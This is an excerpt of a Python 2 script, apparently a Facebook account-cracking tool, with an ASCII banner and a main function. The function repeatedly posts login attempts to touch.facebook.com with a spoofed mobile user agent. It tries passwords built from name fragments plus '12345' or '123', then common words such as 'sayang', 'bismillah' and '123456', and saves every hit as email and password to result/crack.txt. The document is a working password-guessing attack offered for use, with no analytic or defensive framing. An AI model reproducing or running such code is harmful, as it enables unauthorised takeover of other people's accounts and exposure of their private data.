...
logo = ("""          _____  _________   __  ___________   ______
         / __/ |/_/ ___/ /  / / / / __/  _/ | / / __/
        / _/_>  </ /__/ /__/ /_/ /\ \_/ / | |/ / _/  
       /___/_/|_|\___/____/\____/___/___/ |___/___/  
...
def main(arg):
    ...
    try:
        ...
        xo = rex.content
        if 'home' in xo or 'get' in xo or 'save' in xo:
            print '   [OK] '+em+' | '+pw+' | '+bt
            ...
            if 'checkpoint' in xo:
                ...
                if 'home' in xo or 'get' in xo or 'save' in xo:
                    ...
                    if 'checkpoint' in xo:
                        ...
                        pw3 = dp+'12345'
                        rex = requests.post("https://touch.facebook.com/login.php", data = {"email" : em, "pass" : pw3, "login" : "submit"}, headers = { "user-agent" : "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"})
                        xo = rex.content
                        if 'home' in xo or 'get' in xo or 'save' in xo:
                            print '   [OK] '+em+' | '+pw3+' | '+bt
                            oke = open('result/crack.txt', 'a')
                            ...
                            if 'checkpoint' in xo:
                                ...
                                pw4 = bk+'123'
                                rex = requests.post("https://touch.facebook.com/login.php", data = {"email" : em, "pass" : pw4, "login" : "submit"}, headers = { "user-agent" : "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"})
                                xo = rex.content
                                if 'home' in xo or 'get' in xo or 'save' in xo:
                                    print '   [OK] '+em+' | '+pw4+' | '+bt
                                    oke = open('result/crack.txt', 'a')
                                    ...
                                    if 'checkpoint' in xo:
                                        ...
                                        pw5 = 'sayang'
                                        rex = requests.post("https://touch.facebook.com/login.php", data = {"email" : em, "pass" : pw5, "login" : "submit"}, headers = { "user-agent" : "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"})
                                        xo = rex.content
                                        if 'home' in xo or 'get' in xo or 'save' in xo:
                                            print '   [OK] '+em+' | '+pw5+' | '+bt
                                            oke = open('result/crack.txt', 'a')
                                            ...
                                            if 'checkpoint' in xo:
                                                ...
                                                pw6 = 'bismillah'
                                                rex = requests.post("https://touch.facebook.com/login.php", data = {"email" : em, "pass" : pw6, "login" : "submit"}, headers = { "user-agent" : "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"})
                                                xo = rex.content
                                                if 'home' in xo or 'get' in xo or 'save' in xo:
                                                    print '   [OK] '+em+' | '+pw6+' | '+bt
                                                    oke = open('result/crack.txt', 'a')
                                                    ...
                                                    if 'checkpoint' in xo:
                                                        ...
                                                        pw7 = '123456'
                                                        rex = requests.post("https://touch.facebook.com/login.php", data = {"email" : em, "pass" : pw7, "login" : "submit"}, headers = { "user-agent" : "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"})
                                                        xo = rex.content
                                                        if 'home' in xo or 'get' in xo or 'save' in xo:
                                                            print '   [OK] '+em+' | '+pw7+' | '+bt
                                                            oke = open('result/crack.txt', 'a')
                                                            ...
                                                            if 'checkpoint' in xo:
                                                                ...
                                                                pw8 = 'anjing'
                                                                rex = requests.post("https://touch.facebook.com/login.php", data = {"email" : em, "pass" : pw8, "login" : "submit"}, headers = { "user-agent" : "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"})
                                                                xo = rex.content
                                                                if 'home' in xo or 'get' in xo or 'save' in xo:
                                                                    print '   [OK] '+em+' | '+pw8+' | '+bt
                                                                    oke = open('result/crack.txt', 'a')
